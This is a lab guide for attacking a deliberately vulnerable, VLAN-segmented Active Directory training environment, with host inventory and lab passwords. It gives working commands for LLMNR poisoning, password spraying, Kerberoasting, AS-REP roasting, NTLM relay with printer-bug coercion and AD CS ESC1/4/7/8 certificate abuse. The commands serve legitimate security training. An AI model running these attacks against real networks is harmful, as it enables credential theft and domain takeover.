# AD Pentest VLAN Lab — Attack Guide

**Lab version:** 2.1.5  
**Author:** Miguel A. Carlo

---

## Table of Contents

1. [Lab Setup and Verification](#1-lab-setup-and-verification)  
2. [Network Architecture and VLAN Map](#2-network-architecture-and-vlan-map)  
3. [VLAN Enumeration Strategy](#3-vlan-enumeration-strategy)  
4. [Active Directory Enumeration](#4-active-directory-enumeration)  
5. [Initial Access](#5-initial-access)  
6. [Credential Attacks](#6-credential-attacks)  
7. [Active Directory Certificate Services](#7-active-directory-certificate-services)  
8–15. Modern AD Attacks, Lateral Movement Across VLANs, Domain Compromise,
Cloud Attacks (LocalStack), LLM Security Testing, Web Application Attacks,
Post-Exploitation and Persistence, and Lab Reset — **not yet written up as
individual sections; see [Sections 8–15 (Pending)](#sections-815-pending) below.**

---

## Lab Reference

### VLAN Segments

| VLAN | Name         | Subnet         | Purpose                                |
|------|--------------|----------------|----------------------------------------|
| 10   | Management   | 172.28.10.0/24 | DC, CA, DB — core AD infrastructure   |
| 20   | Workstations | 172.28.20.0/24 | Domain-joined end-user systems        |
| 30   | Servers      | 172.28.30.0/24 | Internal servers, LLM platform, cloud |
| 40   | DMZ          | 172.28.40.0/24 | Public-facing and legacy targets      |
| 99   | Attacker     | 172.28.99.0/24 | Kali Linux red team platform          |

### VM Inventory

(Updated to current 12‑VM topology.)

| Host          | IP             | VLAN | OS                  | Role                                  |
|---------------|----------------|------|---------------------|---------------------------------------|
| kali          | 172.28.99.10   | 99   | Kali Linux          | Attacker                              |
| DC01          | 172.28.10.21   | 10   | Windows Server 2022 | Domain Controller                     |
| DB01          | 172.28.10.23   | 10   | Windows Server 2019 | SQL Server                            |
| CA01-ESC      | 172.28.10.25   | 10   | Windows Server 2022 | AD CS with ESC misconfigurations      |
| WIN10         | 172.28.20.30   | 20   | Windows 10          | Domain workstation                    |
| llm01         | 172.28.30.60   | 30   | Ubuntu 22.04        | LLM security platform                 |
| linux01       | 172.28.30.72   | 30   | Ubuntu 22.04        | Linux domain member                   |
| print01       | 172.28.30.73   | 30   | Windows Server 2019 | Print Server                          |
| cloud-pentest | 172.28.30.80   | 30   | Ubuntu 22.04        | LocalStack AWS simulation             |
| metasploitable2 | 172.28.40.12 | 40   | Legacy Linux        | Legacy vulnerable target              |
| juice-shop    | 172.28.40.15   | 40   | Ubuntu 22.04        | OWASP Juice Shop                      |
| opnsense      | 172.28.10.1    | 10   | OPNsense            | Router / firewall / DHCP              |

### Credentials Reference

(Keep this aligned to your provisioning.)

| Account        | Password        | Notes                                   |
|----------------|-----------------|-----------------------------------------|
| labadmin       | LabAdmin123!    | Domain Admin                            |
| Administrator  | Passw0rd!       | Built-in Domain Admin                   |
| vagrant        | Vagrant123!     | Standard domain user                    |
| svc_asrep      | ServiceP@ss1    | Pre-auth disabled, AS-REP target        |
| svc_kerberoast | ServiceP@ss2    | SPN registered, Kerberoast target       |
| svc_delegate   | DelegateP@ss123 | Constrained Delegation                  |
| svc_sql        | SqlSvcPass123!  | SQL Server service account              |
| svc_caadmin    | CaAdminP@ss1    | CA manager rights                       |
| svc_print      | PrintPass123!   | Print Spooler account                   |
| svc_backup     | BackupPass123!  | Backup Operators group                  |
| john.doe       | Password123!    | Helpdesk, password-spray target         |
| alice.brown    | GPOP@ss789!     | Security Analyst, ESC path              |
| sa (SQL)       | SaAdmin123!     | SQL Server SA login                     |
| root (Linux)   | toor            | All Linux VMs                           |
| msfadmin       | msfadmin        | Metasploitable2                         |

---

## 1. Lab Setup and Verification

### Start the Lab

```bash
cd labs/security/active-directory/vlan-segmented

# Deploy all VMs (according to LAB_PROFILE)
vagrant up

# Or use the interactive VLAN manager
./scripts/vagrant-manager.sh

# Verify all VMs are running
vagrant status
```

### Verify VLAN Routing from Kali

```bash
vagrant ssh kali

# Test reachability across all VLANs
ping -c 1 172.28.10.21   # VLAN 10 — DC01
ping -c 1 172.28.20.30   # VLAN 20 — WIN10
ping -c 1 172.28.30.60   # VLAN 30 — llm01
ping -c 1 172.28.40.12   # VLAN 40 — metasploitable2
```

### Quick Domain Authentication Check

```bash
nxc smb 172.28.10.21 -u vagrant -p Vagrant123! --shares
```

### On-Kali Cheatsheet

```bash
cat /root/attacks/README.txt
```

### Install Tools

```bash
# Core AD attack tools
pip3 install impacket certipy-ad bloodhound netexec pywhisker

# Kerbrute
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 \
  -O /usr/local/bin/kerbrute && chmod +x /usr/local/bin/kerbrute

# Coercer (PetitPotam / PrinterBug coercion)
pip3 install coercer

# PKINITtools (Shadow Credentials)
git clone https://github.com/dirkjanm/PKINITtools /opt/PKINITtools

# NoPac
git clone https://github.com/Ridter/noPac /opt/noPac

# Start Neo4j for BloodHound
sudo neo4j start

# Create output directories
mkdir -p ~/lab/{recon,creds,adcs,lateral,cloud,llm,loot}
```

---

## 2. Network Architecture and VLAN Map

```text
172.28.99.10 (kali, VLAN 99 — Attacker)
        │
        ├── VLAN 10 (Management) 172.28.10.0/24
        │       ├── 172.28.10.21  DC01       Domain Controller
        │       ├── 172.28.10.25  CA01-ESC   AD CS — ESC vulnerabilities
        │       └── 172.28.10.23  DB01       SQL Server
        │
        ├── VLAN 20 (Workstations) 172.28.20.0/24
        │       └── 172.28.20.30  WIN10      Domain workstation
        │
        ├── VLAN 30 (Servers) 172.28.30.0/24
        │       ├── 172.28.30.60  llm01        LLM platform
        │       ├── 172.28.30.72  linux01      Linux domain member
        │       ├── 172.28.30.73  print01      Print Server
        │       └── 172.28.30.80  cloud-pentest LocalStack AWS
        │
        └── VLAN 40 (DMZ) 172.28.40.0/24
                ├── 172.28.40.12  metasploitable2  Legacy target
                └── 172.28.40.15  juice-shop       OWASP Juice Shop
```

---

## 3. VLAN Enumeration Strategy

### Sweep All VLANs from Kali

```bash
# Host discovery across all VLANs
for subnet in 172.28.10 172.28.20 172.28.30 172.28.40; do
  echo "=== Sweeping $subnet.0/24 ==="
  nmap -sn $subnet.0/24 --min-rate 500 \
    -oN ~/lab/recon/sweep_${subnet//./_}.txt
done

# Full service scan of all live hosts
nmap -sV -sC -T4 --top-ports 500 \
  172.28.10.0/24 172.28.20.0/24 \
  172.28.30.0/24 172.28.40.0/24 \
  -oN ~/lab/recon/all_services.txt
```

### SMB Relay Target Discovery

```bash
# Find hosts without SMB signing — these are relay targets
nxc smb \
  172.28.10.0/24 172.28.20.0/24 172.28.30.0/24 \
  --gen-relay-list ~/lab/recon/relay_targets.txt

cat ~/lab/recon/relay_targets.txt
# Expected: DB01, WIN10, print01
```

### DNS Reconnaissance

```bash
# Zone transfer (enabled in lab)
dig axfr @172.28.10.21 lab.local \
  | tee ~/lab/recon/dns_zonetransfer.txt

dnsrecon -d lab.local -n 172.28.10.21 \
  -a -z -o ~/lab/recon/dnsrecon.txt
```

---

## 4. Active Directory Enumeration

### BloodHound Collection

```bash
bloodhound-python \
  -u vagrant -p Vagrant123! \
  -d lab.local \
  -dc 172.28.10.21 \
  -ns 172.28.10.21 \
  -c All \
  -o ~/lab/recon/bloodhound/
```

### LDAP Enumeration

```bash
# All users
ldapsearch -x -H ldap://172.28.10.21 \
  -D "vagrant@lab.local" -w "Vagrant123!" \
  -b "dc=lab,dc=local" \
  "(objectClass=user)" sAMAccountName memberOf \
  > ~/lab/recon/ldap_users.txt

# AS-REP targets (pre-auth disabled)
ldapsearch -x -H ldap://172.28.10.21 \
  -D "vagrant@lab.local" -w "Vagrant123!" \
  -b "dc=lab,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName | tee ~/lab/recon/asrep_targets.txt

# SPN accounts (Kerberoast targets)
ldapsearch -x -H ldap://172.28.10.21 \
  -D "vagrant@lab.local" -w "Vagrant123!" \
  -b "dc=lab,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName \
  | tee ~/lab/recon/spn_targets.txt

# NetExec shortcuts
nxc ldap 172.28.10.21 -u vagrant -p Vagrant123! --users
nxc ldap 172.28.10.21 -u vagrant -p Vagrant123! --groups
nxc ldap 172.28.10.21 -u vagrant -p Vagrant123! --computers
```

---

## 5. Initial Access

### LLMNR / NBT-NS Poisoning

```bash
sudo responder -I eth1 -wPFbv

# Crack captured NTLMv2 hashes
hashcat -m 5600 \
  /usr/share/responder/logs/SMB-NTLMv2-*.txt \
  /usr/share/wordlists/rockyou.txt \
  -o ~/lab/creds/responder_cracked.txt
```

### Password Spraying

```bash
# SMB spray
nxc smb 172.28.10.21 \
  -u ~/lab/recon/users.txt \
  -p 'Password123!' \
  --continue-on-success

# Kerberos spray (quieter)
kerbrute passwordspray \
  -d lab.local --dc 172.28.10.21 \
  ~/lab/recon/users.txt 'Password123!'
```

### GPP Credential Extraction

```bash
smbclient //172.28.10.21/SYSVOL \
  -U vagrant%Vagrant123! \
  -c 'get "lab.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Preferences/Groups/Groups.xml" /tmp/Groups.xml'

gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

---

## 6. Credential Attacks

### AS-REP Roasting

```bash
GetNPUsers.py lab.local/ \
  -dc-ip 172.28.10.21 \
  -request -format hashcat \
  -outputfile ~/lab/creds/asreproast.hashes

hashcat -m 18200 ~/lab/creds/asreproast.hashes \
  /usr/share/wordlists/rockyou.txt \
  -o ~/lab/creds/asreproast_cracked.txt
```

### Kerberoasting

```bash
GetUserSPNs.py lab.local/vagrant:Vagrant123! \
  -dc-ip 172.28.10.21 \
  -request \
  -outputfile ~/lab/creds/kerberoast.hashes

hashcat -m 13100 ~/lab/creds/kerberoast.hashes \
  /usr/share/wordlists/rockyou.txt \
  -o ~/lab/creds/kerberoast_cracked.txt
```

### NTLM Relay — Cross-VLAN

```bash
ntlmrelayx.py \
  -tf ~/lab/recon/relay_targets.txt \
  -smb2support -socks

python3 printerbug.py \
  lab.local/vagrant:Vagrant123!@172.28.10.21 \
  172.28.99.10
```

---

## 7. Active Directory Certificate Services

`CA01-ESC` (`172.28.10.25`) exposes ESC1, ESC4, ESC7, ESC8 (and any others you kept).

### Enumerate

```bash
certipy find \
  -u vagrant@lab.local -p Vagrant123! \
  -dc-ip 172.28.10.21 \
  -vulnerable -stdout \
  | tee ~/lab/adcs/vulnerable_templates.txt
```

### ESC1 — Enrollee Supplies Subject

```bash
certipy req \
  -u vagrant@lab.local -p Vagrant123! \
  -target ca01-esc.lab.local \
  -ca LAB-ESC-CA \
  -template VulnESC1 \
  -upn administrator@lab.local \
  -out ~/lab/adcs/esc1_admin.pfx

certipy auth \
  -pfx ~/lab/adcs/esc1_admin.pfx \
  -dc-ip 172.28.10.21
```

### ESC4 — Write Permissions on Template

```bash
certipy template \
  -u alice.brown@lab.local -p 'GPOP@ss789!' \
  -template VulnESC4 -save-old

certipy req \
  -u alice.brown@lab.local -p 'GPOP@ss789!' \
  -target ca01-esc.lab.local \
  -ca LAB-ESC-CA \
  -template VulnESC4 \
  -upn administrator@lab.local \
  -out ~/lab/adcs/esc4_admin.pfx

certipy template \
  -u alice.brown@lab.local -p 'GPOP@ss789!' \
  -template VulnESC4 \
  -configuration VulnESC4.json

certipy auth \
  -pfx ~/lab/adcs/esc4_admin.pfx \
  -dc-ip 172.28.10.21
```

### ESC7 — Manage CA / Certificates

```bash
certipy ca \
  -u svc_caadmin@lab.local -p 'CaAdminP@ss1' \
  -target ca01-esc.lab.local \
  -ca LAB-ESC-CA -add-officer vagrant

certipy ca \
  -u vagrant@lab.local -p Vagrant123! \
  -target ca01-esc.lab.local \
  -ca LAB-ESC-CA -enable-template SubCA

certipy req \
  -u vagrant@lab.local -p Vagrant123! \
  -target ca01-esc.lab.local \
  -ca LAB-ESC-CA -template SubCA \
  -upn administrator@lab.local
```

### ESC8 — NTLM Relay to AD CS HTTP Endpoint

```bash
certipy relay \
  -target http://172.28.10.25/certsrv/ \
  -template DomainController

python3 /opt/coercer/coercer/coercer.py \
  -l 172.28.99.10 \
  -t 172.28.10.21 \
  -u vagrant -p Vagrant123! \
  -d lab.local
```

> **Note:** ESC9 (No Security Extension) is not implemented in this lab.
> Implemented AD CS scenarios are ESC1, ESC3, ESC4, ESC7, and ESC8.

---

## Sections 8–15 (Pending)

The remaining scenarios (ZeroLogon, PetitPotam, Shadow Credentials, NoPac,
RBCD, PrintNightmare; lateral movement; DCSync / tickets; LocalStack; LLM;
web; persistence; reset; summary) follow the same host inventory and
credentials referenced above.

All host references match the 12-VM list. `exch01`, `sp01`, and
`pnpt-internal` were removed from this lab's Vagrantfile during the
2026-07-17 cleanup and are no longer deployed.
